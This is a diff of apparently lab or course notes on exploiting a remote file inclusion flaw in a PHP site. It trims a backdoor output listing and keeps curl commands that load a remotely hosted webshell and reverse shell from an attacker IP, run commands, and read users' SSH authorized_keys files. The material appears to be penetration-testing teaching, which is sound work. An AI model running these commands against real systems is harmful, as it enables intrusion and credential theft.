@@ -545,22 +545,8 @@ $ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/php-re
 $ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
 
 kali@kali:/usr/share/webshells/php/$ curl "http://valleys.com/comet/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
-
-<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
-<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
-
-<pre>admin.php
-bavarian.php
-css
-fonts
-img
-index.php
-js
-</pre>                        
-    Listing 28 - Exploiting RFI with a PHP backdoor and execution of ls
-
-Listing 28 shows that we successfully exploited an RFI vulnerability by including a remotely hosted webshell. 
-We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system, as in the LFI section.
+We successfully exploited an RFI vulnerability by including a remotely hosted webshell. 
+We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system.
 
 $ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
 $ curl "http://valleys.com/comet/index.php?page=http://192.168.119.131:80/simple-backdoor.php&cmd=cat%20/home/mollie/.ssh/authorized_keys"
